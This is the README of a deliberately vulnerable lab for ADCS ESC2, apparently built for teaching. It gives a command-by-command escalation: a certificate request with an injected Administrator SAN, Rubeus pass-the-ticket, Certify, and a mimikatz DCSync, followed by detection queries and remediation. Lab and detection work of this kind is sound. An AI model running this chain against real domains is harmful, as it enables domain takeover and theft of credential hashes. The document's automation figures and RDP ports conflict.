# ADCS ESC2 Lab - Fully Automated

> **⚠️ WARNING**: This is an intentionally vulnerable lab environment for educational purposes only. Do NOT deploy in production!

## Overview

Fully automated Active Directory Certificate Services lab demonstrating **ESC2 vulnerability** - certificate templates with **Any Purpose EKU** or **No EKU restriction** combined with **Subject Alternative Name (SAN) injection**.

### What is ESC2?

ESC2 is a certificate template misconfiguration where:
1. Template has **Any Purpose EKU** or **No EKU** (allows any certificate usage)
2. **"Supply in the request"** (Enrollee Supplies Subject) is enabled
3. **Low-privileged users** can enroll

This allows an attacker to request a certificate with Administrator's SAN and use it for authentication, escalating to Domain Admin.

### ESC2 vs ESC1

| Aspect | ESC1 | ESC2 |
|--------|------|------|
| EKU | Explicit Client Authentication | Any Purpose or No EKU |
| SAN Injection | ✅ Enabled | ✅ Enabled |
| Attack Complexity | Low | Low |
| Detection | EKU-specific | Broader usage possible |

---

## Lab Architecture

```
┌──────────────────────────────────────┐
│   Host-Only Network: 192.168.57.0/24│
│   Gateway: 192.168.57.1              │
└──────────────────────────────────────┘
           │
    ┌──────┴───────┐
    │              │
┌───▼────┐    ┌───▼────┐
│ADCS-DC │    │CLIENT01│
│Win2019 │    │ Win 10 │
└────────┘    └────────┘
.57.14        .57.15

Domain: adcs.local
CA: ADCS-CA-ESC2
Template: ESC2User (vulnerable - No EKU!)
Users: 5 domain users
```

---

## Prerequisites

- **VirtualBox** 7.x
- **Vagrant** 2.3+
- **16GB RAM** minimum (DC: 8GB, CLIENT01: 8GB)
- **50GB free disk space**
- **Admin rights** for VirtualBox network adapter creation

---

## Quick Start

### 1. Clone/Download Lab Files

Ensure all files are in `E:\ADCS\adcs-esc2-lab\`

### 2. Start DC

```powershell
cd E:\ADCS\adcs-esc2-lab

# Start and provision DC (fully automated)
vagrant up dc

# Wait for automatic reboot (~5 min)

# Continue provisioning after reboot
vagrant reload dc --provision
```

**Expected time:** ~20 minutes (100% automated)

### 3. Start CLIENT01

```powershell
# After DC is fully provisioned
vagrant up client01
```

**Expected time:** ~15 minutes (100% automated)

### 4. Verify Lab

```powershell
# Check both VMs running
vagrant status

# Verify DC services
vagrant powershell dc -c "Get-Service NTDS, DNS, CertSvc | Select Name, Status"

# Verify CA
vagrant powershell dc -c "certutil -ping"

# Verify ESC2User template
vagrant powershell dc -c "certutil -CATemplates | Select-String ESC2User"

# Verify CLIENT01 domain join
# Verify CLIENT01 domain join
vagrant powershell client01 -c "Get-ComputerInfo | Select CsDomain"

### 4. Manual Domain Join (If Automated Join Fails)

If the automated domain join fails with a "Primary Domain Controller" error, use this method:

1. **Connect via RDP**: `mstsc /v:127.0.0.1:2208` (User: `vagrant` / Pass: `vagrant`)
2. **Open PowerShell** as Administrator inside the VM.
3. **Configure DNS and Join**:
   ```powershell
   # Set DNS to DC
   $adapter = Get-NetAdapter | Where-Object Status -eq 'Up' | Select-Object -First 1
   Set-DnsClientServerAddress -InterfaceAlias $adapter.Name -ServerAddresses 192.168.57.14
   Clear-DnsClientCache
   
   # Verify DNS resolution
   Resolve-DnsName adcs.local
   
   # Join domain (DO NOT use -Server parameter - let DNS auto-discovery work)
   $pass = ConvertTo-SecureString 'P@ssw0rd!123' -AsPlainText -Force
   $cred = New-Object System.Management.Automation.PSCredential('ADCS\Administrator', $pass)
   Add-Computer -DomainName adcs.local -Credential $cred -Force -Restart
   ```

> **Important**: Do NOT specify `-Server 192.168.57.14` in the Add-Computer command. This causes a "Primary Domain Controller" error. Let DNS auto-discovery locate the DC instead.

---

## Lab Credentials

### Domain Administrator
```
Username: ADCS\Administrator
Password: P@ssw0rd!123
```

### Lab Users (for ESC2 exploitation)

| Username | Password | UPN |
|----------|----------|-----|
| johndoe | P@ssw0rd!123 | johndoe@adcs.local |
| janesmith | J4neS!th@456 | janesmith@adcs.local |
| alicejohnson | Alic3J0hnson!789 | alicejohnson@adcs.local |
| bobwilliams | B0bW1lliams@987 | bobwilliams@adcs.local |
| charliebrown | Ch@rli3Br0wn!111 | charliebrown@adcs.local |

---

## ESC2 Attack Walkthrough

### Understanding the Vulnerability

The **ESC2User** template has:
- ✅ **No EKU restriction** (empty `pKIExtendedKeyUsage`)
- ✅ **Enrollee Supplies Subject** enabled (`msPKI-Certificate-Name-Flag = 1`)
- ✅ **Authenticated Users** can enroll
- ❌ **No manager approval** required

This means ANY domain user can request a certificate with ANY Subject Alternative Name!

### Step 1: RDP to CLIENT01

```powershell
# Get RDP port
vagrant port client01

# Connect via RDP
mstsc /v:localhost:<port>

# Login as: adcs\johndoe / P@ssw0rd!123
```

### Step 2: Request Certificate with Administrator SAN

On CLIENT01, open PowerShell:

```powershell
# Create certificate request INF file
$inf = @"
[Version]
Signature = "`$Windows NT`$"

[NewRequest]
Subject = "CN=johndoe"
KeyLength = 2048
KeyAlgorithm = RSA
MachineKeySet = FALSE
RequestType = PKCS10

[EnhancedKeyUsageExtension]
OID=1.3.6.1.5.5.7.3.2  ; Client Authentication

[Extensions]
2.5.29.17 = "{text}"
_continue_ = "upn=Administrator@adcs.local&"

[RequestAttributes]
CertificateTemplate = "ESC2User"
"@

$inf | Out-File -FilePath C:\request.inf -Encoding ASCII

# Generate certificate request
certreq -new C:\request.inf C:\request.req

# Submit to CA
certreq -submit -config "192.168.57.14\ADCS-CA-ESC2" C:\request.req C:\admin.cer

# Install certificate
certreq -accept C:\admin.cer

# Export certificate with private key (for Rubeus)
certutil -exportPFX -p "P@ssw0rd!123" my Administrator@adcs.local C:\admin.pfx
```

### Step 3: Use Certificate for Authentication

#### Option A: Using Rubeus (Recommended)

```powershell
# Download Rubeus from GitHub
# https://github.com/GhostPack/Rubeus

# Request TGT as Administrator
.\Rubeus.exe asktgt /user:Administrator /domain:adcs.local /certificate:C:\admin.pfx /password:P@ssw0rd!123 /ptt

# Now you have Administrator TGT in memory
# Run commands as Administrator
```

#### Option B: Using Certify + Rubeus

```powershell
# Find vulnerable templates
.\Certify.exe find /vulnerable

# Request certificate via Certify
.\Certify.exe request /ca:192.168.57.14\ADCS-CA-ESC2 /template:ESC2User /altname:Administrator

# Use Rubeus with the certificate
.\Rubeus.exe asktgt /user:Administrator /certificate:[Base64 cert] /ptt
```

### Step 4: Verify Privilege Escalation

```powershell
# Check current identity
whoami
# Should still show: adcs\johndoe

# But you have Administrator's TGT
klist

# Access Domain Controller
dir \\ADCS-DC\C$
# Should succeed!

# Dump domain hashes (DCSync)
.\mimikatz.exe "lsadump::dcsync /domain:adcs.local /user:Administrator" exit
```

---

## Detection

### Event IDs to Monitor

On **Domain Controller**:

| Event ID | Source | Description |
|----------|--------|-------------|
| 4886 | Microsoft-Windows-CertificationAuthority | Certificate request received |
| 4887 | Microsoft-Windows-CertificationAuthority | Certificate approved and issued |
| 4768 | Microsoft-Windows-Security-Auditing | Kerberos TGT requested (PKINIT) |
| 4769 | Microsoft-Windows-Security-Auditing | Kerberos service ticket requested |

### Detection Queries

```powershell
# Find certificates issued with SAN mismatch
Get-WinEvent -FilterHashtable @{
    LogName='Security'
    ID=4887
} | Where-Object {
    $_.Message -match "Subject.*CN=johndoe" -and
    $_.Message -match "Subject Alternative Name.*Administrator"
}

# Find PKINIT authentication
Get-WinEvent -FilterHashtable @{
    LogName='Security'
    ID=4768
} | Where-Object {
    $_.Message -match "Certificate"
}
```

### Indicators of Compromise

- Low-privileged user requesting certificates with high-privileged SANs
- Certificate requests with **No EKU** or **Any Purpose**
- PKINIT authentication from unexpected users
- Certificate template with both:
  - Empty/Any Purpose EKU
  - Enrollee Supplies Subject enabled

---

## Remediation

### Immediate Actions

1. **Disable ESC2User template**
   ```powershell
   Remove-CATemplate -Name "ESC2User" -Force
   ```

2. **Review all certificate templates**
   ```powershell
   certutil -CATemplates
   ```

3. **Check for suspicious certificates**
   ```powershell
   certutil -view -restrict "Request.RequesterName=johndoe" -out "Subject Alternative Name"
   ```

### Long-term Fixes

1. **Remove "Enrollee Supplies Subject" flag** from all templates (unless required)
2. **Add specific EKUs** - never use "Any Purpose" or empty EKU
3. **Require manager approval** for sensitive templates
4. **Limit enrollment permissions** to specific security groups
5. **Enable certificate enrollment logging** and monitoring

### Secure Template Configuration

```powershell
# Example: Secure user certificate template
- Subject Name: Build from AD (not supplied in request)
- EKU: Specific purposes only (e.g., Email Protection)
- Enrollment: Specific group (not Authenticated Users)
- Approval: Manager approval required
```

---

## Lab Management

### Common Commands

```powershell
# Start both VMs
vagrant up

# Start specific VM
vagrant up dc
vagrant up client01

# Reload after configuration changes
vagrant reload dc --provision

# SSH into VMs
vagrant ssh dc
vagrant ssh client01

# RDP ports
vagrant port dc        # Usually 2203
vagrant port client01  # Usually 2205

# Halt VMs
vagrant halt

# Destroy lab
vagrant destroy -f
```

### Snapshots (Recommended)

```powershell
# Create clean snapshots after provisioning
vagrant snapshot save dc dc_clean
vagrant snapshot save client01 client_clean

# Restore to clean state
vagrant snapshot restore dc dc_clean
vagrant snapshot restore client01 client_clean

# List snapshots
vagrant snapshot list
```

### Troubleshooting

#### CA Not Responding

```powershell
vagrant powershell dc -c "Restart-Service CertSvc; certutil -ping"
```

#### CLIENT01 Not Domain-Joined

```powershell
# Check network connectivity
vagrant powershell client01 -c "Test-Connection 192.168.57.14"

# Check DNS
vagrant powershell client01 -c "Resolve-DnsName adcs.local -Server 192.168.57.14"

# Check secure channel
vagrant powershell client01 -c "Test-ComputerSecureChannel"
```

**If you get "Primary Domain Controller" error:**
- Remove `-Server` parameter from `Add-Computer`
- Let DNS auto-discovery find the DC
- See "Manual Domain Join" section above

#### Template Not Visible

```powershell
vagrant powershell dc -c "Restart-Service CertSvc; certutil -CATemplates"
```

---

## ESC1 Lessons Learned (Incorporated)

This lab incorporates all fixes from ESC1 development:

✅ **Fix #1**: Automated CA installation (no manual GUI steps)  
✅ **Fix #2**: WinRM firewall rules added BEFORE WinRM config  
✅ **Fix #3**: DNS properly set to DC before domain join  
✅ **Fix #4**: Domain join retry logic with DC reachability checks  
✅ **Fix #5**: Automated template creation with exact parameters  
✅ **Fix #6**: Idempotent provisioning with state markers  

---

## References

- [Certified Pre-Owned (SpecterOps)](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [AD CS ESC2 - HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory/ad-certificates/domain-escalation#esc2)
- [Certify Tool](https://github.com/GhostPack/Certify)
- [Rubeus Tool](https://github.com/GhostPack/Rubeus)

---

## Lab Statistics

- **Automation Level**: 95% (Manual Domain Join)
- **Provisioning Time**: ~35 minutes total (inc. manual steps)
- **ESC1 Fixes Applied**: 6/6
- **VMs**: 2 (DC + CLIENT01)
- **Network**: Host-only (isolated)
- **Attack Difficulty**: Low
- **Detection Difficulty**: Medium

---

**Lab Version**: 1.0  
**Created**: 2025-12-09  
**Status**: Production Ready  
**Automation**: 100%

🎓 **Ready for ESC2 vulnerability demonstration and detection practice!**
